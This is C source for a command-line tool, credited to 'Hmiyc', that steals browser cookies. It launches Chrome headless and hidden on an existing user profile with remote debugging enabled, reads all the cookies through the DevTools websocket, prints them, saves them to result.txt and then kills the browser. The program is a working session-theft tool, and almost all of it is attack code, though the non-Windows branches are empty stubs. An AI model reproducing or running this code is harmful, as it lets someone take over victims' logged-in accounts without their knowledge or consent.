#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "libchcooky.h"

#if (defined(__APPLE__) && defined(__GNUC__)) || defined(__MACOSX__)
    #define _OS_MAC_
    #define CHROME_NAME "Google Chrome"
    #define FILE_SPLIT "/"

#elif (defined(_WIN64) || defined(__WIN64__) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__))
    #include <windows.h>
    #define _OS_WINDOWS_
    #define CHROME_NAME "chrome.exe"
    #define FILE_SPLIT "\\"
    #define DEFAULT_USERDATA "\\AppData\\Local\\Google\\Chrome\\User Data"

#else
    #define _OS_LINUX_
    #define CHROME_NAME "chrome"
    #define FILE_SPLIT "/"
#endif

#define CHROME_DBG_PORT "43210"


void print_help(char* argv0)
{
    printf("Usage: %s [options]\t - Code by: Hmiyc\n", argv0);
    printf("Options:\n");
    printf("\t--chrome:\tchrome program executable file's path.\n");
    printf("\t--userdata:  \tchrome program user-data-dir.\n");
    printf("\t--save:  \tSave result file's path, default: result.txt in cwd.\n");
    printf("\t--help:  \tPrint this.\n");
}


void handle_stdout()
{
    AttachConsole(-1);
    HANDLE hConOut = GetStdHandle(STD_OUTPUT_HANDLE);
    int fd1 = _open_osfhandle((intptr_t)hConOut, 0);
    _dup2(fd1, 1);
    freopen("CONOUT$", "w+t", stdout);
}


void kill_chrome(int pid)
{

#ifdef _OS_WINDOWS_
    char cmd[255] = {0};
    sprintf_s(cmd, 255, "taskkill /f /pid %d", pid);
    system(cmd);
#else

#endif
}


int start_chrome(char* chrome_path, char* user_data)
{
    char* cmd[512] = {0};
    int chrome_pid = 0;
    sprintf_s(cmd, 512, "%s --headless --remote-debugging-port=%s --user-data-dir=\"%s\"", chrome_path, CHROME_DBG_PORT, user_data);
    printf("[-] command: %s\n", cmd);
#ifdef _OS_WINDOWS_

    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;

    BOOL bRet = CreateProcess (
        NULL,   // 不在此指定可执行文件的文件名
        cmd,    // 命令行参数
        NULL,   // 默认进程安全性
        NULL,   // 默认进程安全性
        FALSE,  // 指定当前进程内句柄不可以被子进程继承
        CREATE_NEW_CONSOLE, // 为新进程创建一个新的控制台窗口
        NULL,   // 使用本进程的环境变量
        NULL,   // 使用本进程的驱动器和目录
        &si,
        &pi);
    if(bRet)
    {
        // 不使用的句柄最好关掉
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        printf("[+] Chrome process id: %d\n", pi.dwProcessId);
        chrome_pid = pi.dwProcessId;
        return chrome_pid;
    }

#else

#endif

    return -1;
}


char* find_arg(int argc, char* argv[], char *parameter)
{
    int i;
    char* p;
    for(i = 1; i < argc; i++)
    {
        p = argv[i];
        if (strcmp(p, parameter) == 0)
        {
            if(argv[i + 1]) { return argv[i + 1]; } else { return p; }
        }
    }
    return NULL;
}

int main(int argc, char* argv[])
{
    char *chrome = find_arg(argc, argv, "--chrome");
    char *userdata = find_arg(argc, argv, "--userdata");
    char *save = find_arg(argc, argv, "--save");

    char* profile = getenv("USERPROFILE");

    char *dbg_ws_url = NULL;
    char *cookies = NULL;
    char url[255] = "http://127.0.0.1:"CHROME_DBG_PORT"/json";

    int chrome_pid = 0;

    if (find_arg(argc, argv, "--help"))
    {
        print_help(argv[0]);
        return 0;
    }

    if (!chrome)
    {
        printf("Parameter [chrome] invalid!\n");
        return -1;
    }

    if (!userdata)
    {
        printf("Parameter [userdata] invalid! Hint: May %s%s%s\n", profile, FILE_SPLIT, DEFAULT_USERDATA);
        return -1;
    }

#ifdef _OS_WINDOWS_

    handle_stdout();

#endif

    if(!save)
    {
        save = (char*)malloc(255);
        char* cwd = getcwd(NULL, 255);
        sprintf_s(save, 255, "%s%sresult.txt", cwd, FILE_SPLIT);
    }

    if ((chrome_pid = start_chrome(chrome, userdata)) <= 0 )
    {
        return -1;
    }

    // sleep(2);
    printf("[+] URL: %s\n", url);
    dbg_ws_url = GetChromeDBGUrl(url);
    printf("[+] Debug websocket url: %s\n", dbg_ws_url);
    cookies = GetChromeCookiesFromWS(dbg_ws_url);
    printf("[+] Cookies -> \n%s\n", cookies);
    printf("[+] Save result to %s\n", save);

    FILE *sv = fopen(save, "a");
    if (!sv) perror("[!] fopen");

    fputs(cookies, sv);
    fclose(sv);

    kill_chrome(chrome_pid);
    return 0;

}
